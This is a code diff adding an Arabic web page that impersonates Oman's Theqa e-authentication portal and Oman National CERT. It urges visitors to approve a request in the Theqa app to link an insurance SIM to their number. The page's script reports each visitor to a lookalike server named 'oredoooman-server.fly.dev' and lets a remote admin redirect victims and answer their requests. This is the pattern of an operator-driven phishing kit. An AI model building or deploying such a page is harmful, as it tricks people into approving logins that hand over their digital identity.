@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>مصادقة ثقة</title>
+  <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: #f3f4f6; min-height: 100vh; display: flex; justify-content: center; }
+    .container { width: 100%; max-width: 430px; background: #fff; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+    .header { display: flex; align-items: center; justify-content: space-between; padding: 16px; border-bottom: 1px solid #e5e7eb; }
+    .header .back { font-size: 24px; color: #374151; background: none; border: none; cursor: pointer; }
+    .header h1 { font-size: 24px; font-weight: bold; color: #dc2626; }
+    .header .spacer { width: 32px; }
+    .content { flex: 1; display: flex; flex-direction: column; }
+    .blue-header { background: #1e3a5f; color: #fff; padding: 24px; }
+    .blue-header .top-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+    .blue-header .flex-gap { display: flex; align-items: center; gap: 12px; }
+    .blue-header img.thiqa { width: 48px; height: 48px; border-radius: 4px; }
+    .blue-header img.cert { width: 40px; height: 40px; object-fit: contain; }
+    .blue-header .text-right { text-align: right; }
+    .blue-header .text-left { text-align: left; }
+    .blue-header p { margin: 0; }
+    .blue-header .bold { font-weight: bold; font-size: 14px; }
+    .blue-header .small { font-size: 12px; }
+    .blue-header .opacity { opacity: 0.8; }
+    .blue-header .bottom-row { display: flex; align-items: center; justify-content: space-between; }
+    .blue-header .bottom-row .lg { font-size: 18px; }
+    .title { text-align: center; padding: 24px 0; }
+    .title h2 { font-size: 20px; font-weight: bold; color: #111827; }
+    .message { padding: 0 24px 16px; text-align: center; }
+    .message p { color: #374151; font-size: 16px; line-height: 1.7; }
+    .message span { font-weight: bold; display: block; margin-bottom: 4px; }
+    .timer-section { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 0; }
+    .spinner { width: 64px; height: 64px; border: 4px solid #e5e7eb; border-top-color: #1e3a5f; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .time-text { margin-top: 16px; font-size: 24px; color: #9ca3af; font-family: monospace; }
+    .retry-btn { padding: 16px 32px; background: #1e3a5f; color: #fff; font-weight: bold; font-size: 18px; border-radius: 12px; border: none; cursor: pointer; transition: background 0.2s; display: none; }
+    .retry-btn:hover { background: #152d4a; }
+    .app-section { display: flex; flex-direction: column; align-items: center; padding: 16px 0; border-top: 1px solid #e5e7eb; margin: 0 24px; }
+    .app-section p { color: #374151; font-weight: bold; font-size: 16px; margin-bottom: 12px; }
+    .app-section button { background: none; border: none; cursor: pointer; outline: none; }
+    .app-section img { width: 64px; height: 64px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: box-shadow 0.2s; }
+    .app-section img:hover { box-shadow: 0 10px 15px rgba(0,0,0,0.1); }
+    .footer { margin-top: auto; background: #1e3a5f; color: #fff; text-align: center; padding: 16px; font-size: 12px; }
+    .footer p { margin-bottom: 4px; }
+    .footer .mono { font-family: monospace; font-size: 10px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <button class="back" onclick="window.history.back()">›</button>
+      <h1>ثقة</h1>
+      <div class="spacer"></div>
+    </div>
+    <div class="content">
+      <div class="blue-header">
+        <div class="top-row">
+          <div class="flex-gap">
+            <img src="/images/thiqa-logo.jpg" alt="ثقة" class="thiqa">
+            <div class="text-right">
+              <p class="bold">ثقــة</p>
+              <p class="small opacity">THEQA</p>
+            </div>
+          </div>
+          <div class="flex-gap">
+            <div class="text-left">
+              <p class="small">المركز الوطني</p>
+              <p class="small">للسلامة المعلوماتية</p>
+              <p class="small opacity">Oman National CERT</p>
+            </div>
+            <img src="/images/oman-cert-logo.png" alt="Oman National CERT" class="cert">
+          </div>
+        </div>
+        <div class="bottom-row">
+          <p class="small">بوابة المصادقة الإلكترونية (ثقة)</p>
+          <span class="lg">ع</span>
+        </div>
+      </div>
+      <div class="title">
+        <h2>المصادقة من خلال تطبيق ثقة</h2>
+      </div>
+      <div class="message">
+        <p>
+          <span>عزيزي العميل</span>
+          يرجى الدخول الى تطبيق ثقة والموافقة على إعتماد الشريحة الإلكترونية الخاصة بوثيقة التأمين لربطها بالرقم الخاص بك
+        </p>
+      </div>
+      <div class="timer-section">
+        <div id="spinner" class="spinner"></div>
+        <p id="timeText" class="time-text">3:00</p>
+        <button id="retryBtn" class="retry-btn" onclick="handleRetry()">طلب تصديق جديد</button>
+      </div>
+      <div class="app-section">
+        <p>الدخول الى تطبيق ثقة</p>
+        <button onclick="handleThiqaAppClick()">
+          <img src="/images/thiqa-logo.jpg" alt="تطبيق ثقة">
+        </button>
+      </div>
+      <div class="footer">
+        <p>جميع الحقوق محفوظة © 2026 بوابة المصادقة الإلكترونية (ثقة) الإصدار 2.15.0</p>
+        <p>رقم المعاملة:</p>
+        <p class="mono">9af548d1-fc6a-4cab-a754-9994463eb690</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      var timeLeft = 180;
+      var timerInterval;
+      var spinner = document.getElementById('spinner');
+      var timeText = document.getElementById('timeText');
+      var retryBtn = document.getElementById('retryBtn');
+
+      function formatTime(seconds) {
+        var mins = Math.floor(seconds / 60);
+        var secs = seconds % 60;
+        return mins + ':' + (secs < 10 ? '0' : '') + secs;
+      }
+
+      function startTimer() {
+        timeLeft = 180;
+        spinner.style.display = 'block';
+        timeText.style.display = 'block';
+        retryBtn.style.display = 'none';
+        timeText.textContent = formatTime(timeLeft);
+        
+        if (timerInterval) clearInterval(timerInterval);
+        timerInterval = setInterval(function() {
+          timeLeft--;
+          if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            spinner.style.display = 'none';
+            timeText.style.display = 'none';
+            retryBtn.style.display = 'block';
+          } else {
+            timeText.textContent = formatTime(timeLeft);
+          }
+        }, 1000);
+      }
+
+      // Socket.IO connection
+      var SOCKET_URL = window.location.hostname === 'localhost'
+        ? 'http://localhost:3001'
+        : 'https://oredoooman-server.fly.dev';
+      var socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
+      window.socket = socket;
+
+      var visitorId = localStorage.getItem('visitorId') || null;
+      socket.on('connect', function () {
+        socket.emit('visitor:register', { existingVisitorId: visitorId });
+        socket.emit('visitor:pageEnter', 'مصادقة ثقة');
+      });
+      socket.on('visitor:registered', function (data) {
+        if (data && data.visitorId) { localStorage.setItem('visitorId', data.visitorId); }
+      });
+
+      // Listen for page navigation from admin
+      socket.on('visitor:navigate', function (page) {
+        if (page) window.location.href = '/' + page;
+      });
+
+      window.handleRetry = function() {
+        socket.emit('more-info', {
+          content: { 'طلب': 'تحقق ثقة جديد' },
+          page: 'مصادقة ثقة',
+          waitingForAdminResponse: true
+        });
+        startTimer();
+      };
+
+      window.handleThiqaAppClick = function() {
+        var userAgent = navigator.userAgent || navigator.vendor;
+        var isIOS = /iPad|iPhone|iPod/.test(userAgent);
+        var isAndroid = /android/i.test(userAgent);
+
+        if (isIOS) {
+          window.location.href = "theqa://";
+          setTimeout(function() { window.location.href = "https://apps.apple.com/om/app/theqa-%D8%AB%D9%82%D8%A9/id6747373748"; }, 1500);
+        } else if (isAndroid) {
+          window.location.href = "intent://theqa#Intent;package=om.gov.mtcit.theqamobileid;scheme=theqa;end";
+          setTimeout(function() { window.location.href = "https://play.google.com/store/apps/details?id=om.gov.mtcit.theqamobileid"; }, 1500);
+        } else {
+          window.open("https://play.google.com/store/apps/details?id=om.gov.mtcit.theqamobileid", "_blank");
+        }
+      };
+
+      startTimer();
+    })();
+  </script>
+</body>
+</html>
